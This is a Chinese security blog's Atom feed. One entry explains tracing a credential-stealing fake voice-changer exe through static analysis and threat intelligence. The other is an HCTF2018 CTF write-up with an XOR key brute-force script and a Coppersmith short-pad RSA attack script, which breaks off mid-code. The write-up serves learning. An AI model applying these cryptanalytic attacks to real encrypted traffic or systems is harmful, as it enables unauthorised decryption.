<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yof3ng&#39;s Blog | 热爱分享</title>
  
  <subtitle>Yof3ng</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yof3ng.xyz/"/>
  <updated>2018-11-20T15:51:37.710Z</updated>
  <id>http://www.yof3ng.xyz/</id>
  
  <author>
    <name>Yof3ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>追踪溯源_小白科普篇</title>
    <link href="http://www.yof3ng.xyz/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/"/>
    <id>http://www.yof3ng.xyz/2018/11/20/追踪溯源-小白科普篇/</id>
    <published>2018-11-20T14:43:11.000Z</published>
    <updated>2018-11-20T15:51:37.710Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="追踪溯源-白话文讲盗号–科普篇"><a href="#追踪溯源-白话文讲盗号–科普篇" class="headerlink" title="追踪溯源_白话文讲盗号–科普篇"></a>追踪溯源_白话文讲盗号–科普篇</h1><blockquote><p>🆒一直一直以来，总是有人不断被盗qq，然后被用以恶意盗号者散播更多的恶意链接或者进行诈骗盈利活动，恶性循环，愈演愈烈，为了给同学们稍微科普一下基本的盗号原理，故有此文。</p><p>从扫二维码盗号，到模拟qq登录界面的钓鱼网站盗号，再到伪造qq在线文档诱导qq用户点击导致的盗号，总之盗号的方式各种各样，但都离不开一个重点，<strong>那就是你的账号是从你的设备上面传输给别人的</strong>（如果你没有到处宣扬你的密码的话😄），或是设备被植入木马，记录键盘输入，抑或是伪造页面使得用户主动输入账号密码等等等等。</p><p>既然知道，账号密码是从自己的设备上传到恶意盗号者手上的，那么问题就变得简单了。</p><p>接下来就从一个邮件钓鱼说起，事情是。</p></blockquote><h2 id="0x00-收到一封可爱的邮件"><a href="#0x00-收到一封可爱的邮件" class="headerlink" title="0x00 收到一封可爱的邮件"></a>0x00 收到一封可爱的邮件</h2><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120225806.png" alt=""></p><blockquote><p>邮件中有可爱的萌妹变声器，有福利小电影，游戏加速器的链接，可谓是吸引人极了，我们先去这个链接下载一个萌妹变声器玩一下。</p><p>这是一个十分典型的exe文件，一般稍微有些基础素养的人都不会随便点开这种exe文件的哦。比exe文件更容易中招的是文档文件，如doc文档，恶意人员可能会利用如office的漏洞，当你点开他精心制作的文档的时候，就会触发如宏病毒，远程代码执行等问题，正中人下怀。</p></blockquote><p>虚拟机是个好东西呢，如果你有什么东西非要冒着风险去运行一下，那么不如装个虚拟机先试试水，这次分析我们就在一个win7的虚拟机中进行。</p><h2 id="0x01-使用工具（IDA-Pro）-进行简单的静态分析"><a href="#0x01-使用工具（IDA-Pro）-进行简单的静态分析" class="headerlink" title="0x01 使用工具（IDA Pro） 进行简单的静态分析"></a>0x01 使用工具（IDA Pro） 进行简单的静态分析</h2><p>下载萌妹变声器.exe后，可以先看看文件属性哦：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120230944.png" alt=""></p><p>文件大小仅有707kb，一个变声器你觉得只需要707kb大小吗？很明显不止的好不好，毕竟变声器这么秀的玩意儿是吧。</p><p>先用PC hunter监控一下运行该文件之前，我们的网络情况（进程，服务等信息）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120231308.png" alt=""></p><p>双击运行一下<code>萌妹变声器.exe</code>，emmm事实是因为虚拟机中缺少一些文件导致无法运行，正常情况下运行之后基本上是可以看到会有多出来的异常进程，而这个进程会对某个ip或者域名进行连接，传输窃取的信息等等。</p><p>那么接下来直接分析吧，IDA Pro反汇编：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232154.png" alt=""></p><p>可以看到，通过反汇编之后，程序内部的一些信息以汇编代码的形式展开，但是我们既然是以白话文的形式来讲这篇科普文章，那肯定不是分析代码咯，只要明白这个流程就行啦。</p><p>接下来我们可以使用IDA pro的<code>shift + f12</code>快捷键来提取这个<code>萌妹变声器.exe</code>中的一些字符串，来看看有没有可疑的明显的线索。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232604.png" alt=""></p><p>很简单就看到了一些关键字眼，如<code>Connection==&gt;连接||Pipe==&gt;管道||Hostname==&gt;主机名</code>等信息。当然，更高级一点的软件或者钓鱼程序不会像这个这么粗糙，至少会给关键字符串加密，加壳或者加反调试措施，这都是后话了（估计小白听不懂）。</p><p>那么再细细找找，能不能找到该钓鱼程序散布者的踪迹呢？</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233000.png" alt=""></p><p>果不其然，IP地址拿到了，去看一眼喏：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233142.png" alt=""></p><h2 id="0x02-简单地追踪溯源"><a href="#0x02-简单地追踪溯源" class="headerlink" title="0x02 简单地追踪溯源"></a>0x02 简单地追踪溯源</h2><p>上面的那个url是一个用来接收窃取到的信息的接口，那么通过现有的信息，我们如何深一步追踪溯源到这位可爱的程序散布者呢？</p><p>当然是威胁情报分析平台走一波咯（如VT，微步），其实我们一开始就可以把该exe文件上传到威胁检测平台进行检测（平台可以对URL，MD5，IP等等信息进行关联查询），但是为了情节需要，先细细分析一下文件，那么我们现在要做的是用威胁情报平台查找得到的IP关联信息：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233709.png" alt=""></p><p>实际上用最开始邮箱中收到的那个域名也一样，我们可以看看关联的文件检测信息：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233930.png" alt=""></p><p>可以看到检测到了威胁，具有一定的危险性：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234058.png" alt=""></p><p>其实接下来就可以对该IP进行更深入的了解了（攻击是不可能攻击的，顶多扫描扫描目录，扫描目录我也是没有扫的）因为下面得到的几个url就够我们找到那个可爱的人了：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234312.png" alt=""></p><p>访问一下这些url：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234500.png" alt=""></p><p>嗯差不多就得了，我们也就不打扰人家了吧。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote><p>总之就是，恶意链接少点去点开啦，就算点开了，没有赋予权限，或者你没有主动输入账号密码，再或者是你没有网络，都基本不会导致被盗号的啦。</p><p>恶意文件自己需要好好分辨咯，就从上面的方法我们基本上就可以避免恶意文件了，但是恶意文档还是需要注意，虽然恶意文档的针对性，伪造难度比较高，但是不排除某天你就被针对了，你说是吧？🤣</p></blockquote><p>若有不符，还望斧正。</p><p>Published by Yof3ng.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;追踪溯源-白话文讲盗号–科普篇&quot;&gt;&lt;a href=&quot;#追踪溯源-白话文讲盗号–科普篇&quot; class=&quot;headerlink&quot; title=&quot;追踪溯源_白话文讲盗号–科普篇&quot;&gt;&lt;/a&gt;追踪溯源_白话文讲盗号–科普篇&lt;/h1&gt;&lt;blockqu
      
    
    </summary>
    
      <category term="信息安全" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="追踪溯源" scheme="http://www.yof3ng.xyz/tags/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90/"/>
    
      <category term="信息安全" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018_学习记录</title>
    <link href="http://www.yof3ng.xyz/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.yof3ng.xyz/2018/11/13/HCTF2018-学习记录/</id>
    <published>2018-11-13T07:34:00.000Z</published>
    <updated>2018-11-13T13:52:40.389Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="HCTF2018-学习记录"><a href="#HCTF2018-学习记录" class="headerlink" title="HCTF2018_学习记录"></a>HCTF2018_学习记录</h1><blockquote><p>重整旗鼓再上路😭，hctf没太重视(其实重视了也不会做)，只能赛后看看师傅们的writeup学习一波。接下来打算学一下基础的密码学，不然老是懵逼可没用呢。</p></blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">HCTF2018_CNSS_WP</a></p><p><a href="https://xz.aliyun.com/t/3256#toc-21" target="_blank" rel="noopener">HCTF2018_ 天枢 _WP</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-23" target="_blank" rel="noopener">HCTF2018_Eur3kA_WP</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1-Xor-game"><a href="#crypto1-Xor-game" class="headerlink" title="crypto1 - Xor_game"></a>crypto1 - Xor_game</h3><blockquote><p>题目给出了一个cipher.txt装有密文，以及一个加密脚本，内容如下：</p><p>cipher.txt:</p><pre class=" language-python"><code class="language-python">ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLVAQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTSVQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkkaHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABHVS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbPhsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHBpHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA95Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAARGxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TLEkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAsXMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREaDB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWFQ0XLRocMgxkNgoAABd<span class="token operator">+</span>PRkIKwkDEAoTLQ1TKwELVAgHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDNQci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAdGUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJRmBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNgUCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdDBpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzYCDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0dKg0fJkk<span class="token operator">/</span>HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuAShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5EwYYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRsCDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsccgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTAU4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKwEWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRIYBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYBPBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdEh1<span class="token operator">+</span>OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFht4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEUGDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9UEAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBGkUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAATRLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkkDHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMIVyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSNgdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgIWfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgRSQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGfx4bPh1OHAQB</code></pre><p>challenge.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#challenge.py</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span>poem <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'poem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"hctf{xxxxxxxxxxx}"</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>poem<span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 通过简单分析其逻辑，可以知道xor_key就是flag花括号中的内容，通过该xor_key对poem.txt中的内容进行加密，并且需要对应长度。因为poem.txt中是一首诗，诗中可能会出现字母，数字，引号，换行等等合法字符，由于我们只有密文，并且知道xor的规律，是xor_key的长度来决定的，那么就可以通过遍历加上简单的判断，写出如下代码(这是最简单的解法，参照<a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">电子科大CNSS战队的wp</a> ）：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp.py</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#检测是否为诗歌正常字符</span><span class="token keyword">def</span> <span class="token function">invalid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token string">'{}[]@#%^*=+'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#换行符为正常字符</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 可能的xor_key长度</span><span class="token keyword">for</span> L <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#对xor_key的每一位进行枚举</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> cand <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#步长为xor_key长度，进行测试</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> cand <span class="token operator">^</span> cipher<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token comment" spellcheck="true">#若不为正常字符，则将flag标志位置为False,不会将该ascii作为可能的xor_key字符</span>                <span class="token keyword">if</span> invalid<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            <span class="token comment" spellcheck="true">#将符合条件的ascii对应的字符添加到对应xor_key字符位置的列表</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cand<span class="token punctuation">)</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        cc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">not</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> cc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113163611.png" alt=""></p><p>这虽然不是最精确的方法，但可以说是简便高效了，还有就是通过xortool来爆破key的长度，以及可能的字符串。或者查看<a href="https://xz.aliyun.com/t/3256#toc-22" target="_blank" rel="noopener">汉明码原理</a>。</p><p>通过xortool瞬间得到key长度最可能为21（记得密文需要是base64解密后的真正内容）：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113170451.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113172004.png" alt=""></p><p>的确可以看到爆破出来的key大多数不成形，比较难猜出，不过得到了key的长度就比较简单了。</p><h3 id="crypto2-Xor-RSA"><a href="#crypto2-Xor-RSA" class="headerlink" title="crypto2 - Xor?RSA"></a>crypto2 - Xor?RSA</h3><blockquote><p>这题涉及到RSA的一种攻击方式：padding过短，可以利用Coppersmith’s short-pad attack。</p><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF中RSA常见攻击方法</a></p><p><a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">浅析RSA Padding Attack-一叶飘零</a></p><p>题目源码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> SocketServer<span class="token keyword">import</span> string<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">ThreadedTCPServer</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>ThreadingMixIn<span class="token punctuation">,</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">RSATCPHandler</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Welcome to flag getting system\ngive me your token > "</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"token error\n"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            n <span class="token operator">=</span> p <span class="token operator">*</span> q            e <span class="token operator">=</span> <span class="token number">5</span>            nbits <span class="token operator">=</span> size<span class="token punctuation">(</span>n<span class="token punctuation">)</span>            kbits <span class="token operator">=</span> nbits <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> e <span class="token operator">*</span> e<span class="token punctuation">)</span>            m1 <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span>nbits<span class="token punctuation">)</span>            m2 <span class="token operator">=</span> m1 <span class="token operator">^</span> getRandomNBitInteger<span class="token punctuation">(</span>kbits<span class="token punctuation">)</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c1="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c2="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"now give me you answer\n"</span><span class="token punctuation">)</span>            ans1 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            ans2 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> str<span class="token punctuation">(</span>ans1<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>ans2<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"wrong answer\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">10086</span>    server <span class="token operator">=</span> ThreadedTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> RSATCPHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113173105.png" alt=""></p><p>这种目前比较常见的密码学出题方式，之前上海第四届大学生网络安全竞赛中也是类似的形式。</p><p>根据网上Coppersmith’s short-pad attack的sage脚本计算得到m1,m2从而getflag:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.sage文件</span><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token 